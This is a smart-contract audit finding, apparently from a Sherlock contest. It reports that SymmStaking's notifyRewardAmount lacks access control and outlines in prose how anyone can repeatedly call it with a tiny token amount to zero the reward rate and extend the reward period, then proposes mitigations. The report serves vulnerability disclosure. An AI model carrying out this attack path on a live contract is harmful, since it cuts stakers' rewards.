# Unrestricted call to `notifyRewardAmount(...)` Leads to Reward System Manipulation

### Summary

Lack of access control on [`notifyRewardAmount(...)`](https://github.com/sherlock-audit/2025-03-symm-io-stacking/blob/main/token/contracts/staking/SymmStaking.sol#L275) in the SymmStaking contract will cause severe reward accounting issues for stakers as an attacker will repeatedly call this function to arbitrarily update the reward state, manipulate the reward rate, and extend the reward period indefinitely.

### Root Cause

In `SymmStaking.sol:257`, the `notifyRewardAmount(...)` function is public and lacks any access restrictions. This oversight allows any caller—not just an authorized admin or reward manager—to trigger reward state updates. Consequently, an attacker can:
- Arbitrarily change the reward rate (often setting it to 0 if the supplied amount is too low relative to the duration).
- Continuously reset the reward period (by setting `periodFinish` to `block.timestamp + DEFAULT_REWARDS_DURATION`), potentially extending it indefinitely.
- Compromise the reward accounting mechanism, leading to unexpected reward calculations for stakers.

### Internal Pre-conditions

1. **Caller Authorization:** Any account (attacker) can call `notifyRewardAmount()` without needing a specific role.  
2. **Token Approval:** The attacker must have a minimal balance of a whitelisted reward token (e.g., 1 USDT) and must be able to approve its transfer.  
3. **Repeated Invocation:** The attacker is able to invoke `notifyRewardAmount()` repeatedly to continuously reset the reward period and manipulate the reward rate.

### External Pre-conditions

1. **Whitelisting:** The reward token used in the attack is already whitelisted (i.e., `isRewardToken[token]` is true).  
2. **ERC20 Transfer Mechanics:** The ERC20 token transfer mechanism allows minimal amounts to be transferred (even as low as 1 token), enabling the attacker to repeatedly trigger the reward state update with negligible cost.


### Attack Path

1. The attacker approves the staking contract to transfer a minimal amount (e.g., 1 USDT) of the reward token.  
2. The attacker calls `notifyRewardAmount([usdtToken], [1])`, causing the contract to update the reward state:
   - The reward rate is recalculated, often resulting in a value of 0 when using a minimal amount.
   - `periodFinish` is reset to `block.timestamp + DEFAULT_REWARDS_DURATION`, extending the reward period.
3. The attacker repeats the above step at intervals, ensuring that the reward period never expires and the reward rate remains manipulated.  
4. As a result, stakers’ earned rewards are capped at a manipulated value, significantly reducing their expected earnings.

### Impact

Stakers suffer a substantial reduction in their accrued rewards due to the manipulated reward calculations. The continuous resetting of the reward period prevents the proper accumulation of rewards over time. Additionally, the admin may lose the ability to effectively manage or blacklist tokens, as the ongoing reward period (driven by unauthorized calls) obstructs corrective actions.

### Mitigation

- **Restrict Access:** Modify the `notifyRewardAmount()` function so that only authorized roles (e.g., admin or reward manager) can call it. Implement role-based access control checks to enforce this restriction.  
- **Limit Reward Period Resets:** Add logic to prevent the continuous resetting of the reward period. For instance, disallow updates if a reward period is already active or ensure that new notifications do not shorten the effective reward duration unexpectedly.
